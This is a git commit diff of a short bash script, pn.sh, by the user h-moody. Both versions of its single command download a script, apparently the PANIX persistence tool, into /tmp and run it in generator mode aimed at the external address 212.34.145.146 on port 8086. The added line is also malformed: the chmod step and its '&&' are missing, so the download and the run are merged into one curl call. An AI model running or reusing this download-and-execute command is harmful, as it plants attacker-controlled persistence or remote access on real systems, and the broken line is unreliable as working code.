4916dee1d16f53a19de23dd533362f41fb93f743
h-moody <73345535+h-moody@users.noreply.github.com>
2024-12-10 20:58:48 +0300

    Update pn.sh

--- pn.sh
+++ pn.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-/bin/bash -c 'curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v2.0.0/panix.sh -o /tmp/pnx.sh && /bin/chmod +x /tmp/pnx.sh && /tmp/pnx.sh --generator --ip 212.34.145.146 --port 8086'
+/bin/bash -c 'curl -sL https://raw.githubusercontent.com/h-moody/tun0/refs/heads/main/panix.sh -o /tmp/pnx.sh /tmp/pnx.sh --generator --ip 212.34.145.146 --port 8086'
